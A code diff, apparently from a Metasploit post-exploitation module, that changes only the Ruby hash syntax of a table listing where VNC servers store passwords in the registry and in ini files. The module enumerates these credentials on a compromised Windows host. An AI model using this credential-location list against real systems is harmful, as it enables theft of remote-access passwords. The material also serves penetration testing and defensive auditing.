@@ -101,100 +101,100 @@ class Metasploit3 < Msf::Post
     progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)')
     progfiles_env.each do |k, v|
       next if v.blank?
-      locations << {:name => 'UltraVNC',
-        :check_file => "#{v}\\UltraVNC\\ultravnc.ini",
-        :pass_variable => 'passwd=',
-        :viewonly_variable => 'passwd2=',
-        :port_variable => 'PortNumber='}
+      locations << {name: 'UltraVNC',
+        check_file: "#{v}\\UltraVNC\\ultravnc.ini",
+        pass_variable: 'passwd=',
+        viewonly_variable: 'passwd2=',
+        port_variable: 'PortNumber='}
     end
 
-    locations << {:name => 'WinVNC3_HKLM',
-      :check_reg => 'HKLM\\Software\\ORL\\WinVNC3',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC3_HKLM',
+      check_reg: 'HKLM\\Software\\ORL\\WinVNC3',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC3_HKCU',
-      :check_reg => 'HKCU\\Software\\ORL\\WinVNC3',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC3_HKCU',
+      check_reg: 'HKCU\\Software\\ORL\\WinVNC3',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC3_HKLM_Default',
-      :check_reg => 'HKLM\\Software\\ORL\\WinVNC3\\Default',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC3_HKLM_Default',
+      check_reg: 'HKLM\\Software\\ORL\\WinVNC3\\Default',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC3_HKCU_Default',
-      :check_reg => 'HKCU\\Software\\ORL\\WinVNC3\\Default',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC3_HKCU_Default',
+      check_reg: 'HKCU\\Software\\ORL\\WinVNC3\\Default',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC_HKLM_Default',
-      :check_reg => 'HKLM\\Software\\ORL\\WinVNC\\Default',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC_HKLM_Default',
+      check_reg: 'HKLM\\Software\\ORL\\WinVNC\\Default',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC_HKCU_Default',
-      :check_reg => 'HKCU\\Software\\ORL\\WinVNC\\Default',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC_HKCU_Default',
+      check_reg: 'HKCU\\Software\\ORL\\WinVNC\\Default',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC4_HKLM',
-      :check_reg => 'HKLM\\Software\\RealVNC\\WinVNC4',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC4_HKLM',
+      check_reg: 'HKLM\\Software\\RealVNC\\WinVNC4',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'WinVNC4_HKCU',
-      :check_reg => 'HKCU\\Software\\RealVNC\\WinVNC4',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'WinVNC4_HKCU',
+      check_reg: 'HKCU\\Software\\RealVNC\\WinVNC4',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'RealVNC_HKLM',
-      :check_reg => 'HKLM\\Software\\RealVNC\\Default',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'RealVNC_HKLM',
+      check_reg: 'HKLM\\Software\\RealVNC\\Default',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'RealVNC_HKCU',
-      :check_reg => 'HKCU\\Software\\RealVNC\\Default',
-      :pass_variable => 'Password',
-      :port_variable => 'PortNumber'}
+    locations << {name: 'RealVNC_HKCU',
+      check_reg: 'HKCU\\Software\\RealVNC\\Default',
+      pass_variable: 'Password',
+      port_variable: 'PortNumber'}
 
-    locations << {:name => 'TightVNC_HKLM',
-      :check_reg => 'HKLM\\Software\\TightVNC\\Server',
-      :pass_variable => 'Password',
-      :port_variable => 'RfbPort'}
+    locations << {name: 'TightVNC_HKLM',
+      check_reg: 'HKLM\\Software\\TightVNC\\Server',
+      pass_variable: 'Password',
+      port_variable: 'RfbPort'}
 
-    locations << {:name => 'TightVNC_HKLM_Control_pass',
-      :check_reg => 'HKLM\\Software\\TightVNC\\Server',
-      :pass_variable => 'ControlPassword',
-      :port_variable => 'RfbPort'}
+    locations << {name: 'TightVNC_HKLM_Control_pass',
+      check_reg: 'HKLM\\Software\\TightVNC\\Server',
+      pass_variable: 'ControlPassword',
+      port_variable: 'RfbPort'}
 
     userhives=load_missing_hives()
     userhives.each do |hive|
       next if hive['HKU'] == nil
-      locations << {:name => "RealVNC_#{hive['SID']}",
-        :check_reg => "#{hive['HKU']}\\Software\\RealVNC\\Default",
-        :pass_variable => 'Password',
-        :port_variable => 'PortNumber'}
+      locations << {name: "RealVNC_#{hive['SID']}",
+        check_reg: "#{hive['HKU']}\\Software\\RealVNC\\Default",
+        pass_variable: 'Password',
+        port_variable: 'PortNumber'}
 
-      locations << {:name => "WinVNC4_#{hive['SID']}",
-        :check_reg => "#{hive['HKU']}\\Software\\RealVNC\\WinVNC4",
-        :pass_variable => 'Password',
-        :port_variable => 'PortNumber'}
+      locations << {name: "WinVNC4_#{hive['SID']}",
+        check_reg: "#{hive['HKU']}\\Software\\RealVNC\\WinVNC4",
+        pass_variable: 'Password',
+        port_variable: 'PortNumber'}
 
-      locations << {:name => "WinVNC_#{hive['SID']}_Default",
-        :check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC\\Default",
-        :pass_variable => 'Password',
-        :port_variable => 'PortNumber'}
+      locations << {name: "WinVNC_#{hive['SID']}_Default",
+        check_reg: "#{hive['HKU']}\\Software\\ORL\\WinVNC\\Default",
+        pass_variable: 'Password',
+        port_variable: 'PortNumber'}
 
-      locations << {:name => "WinVNC3_#{hive['SID']}_Default",
-        :check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC3\\Default",
-        :pass_variable => 'Password',
-        :port_variable => 'PortNumber'}
+      locations << {name: "WinVNC3_#{hive['SID']}_Default",
+        check_reg: "#{hive['HKU']}\\Software\\ORL\\WinVNC3\\Default",
+        pass_variable: 'Password',
+        port_variable: 'PortNumber'}
 
-      locations << {:name => "WinVNC3_#{hive['SID']}",
-        :check_reg => "#{hive['HKU']}\\Software\\ORL\\WinVNC3",
-        :pass_variable => 'Password',
-        :port_variable => 'PortNumber'}
+      locations << {name: "WinVNC3_#{hive['SID']}",
+        check_reg: "#{hive['HKU']}\\Software\\ORL\\WinVNC3",
+        pass_variable: 'Password',
+        port_variable: 'PortNumber'}
     end
 
     print_status("Enumerating VNC passwords on #{sysinfo['Computer']}")
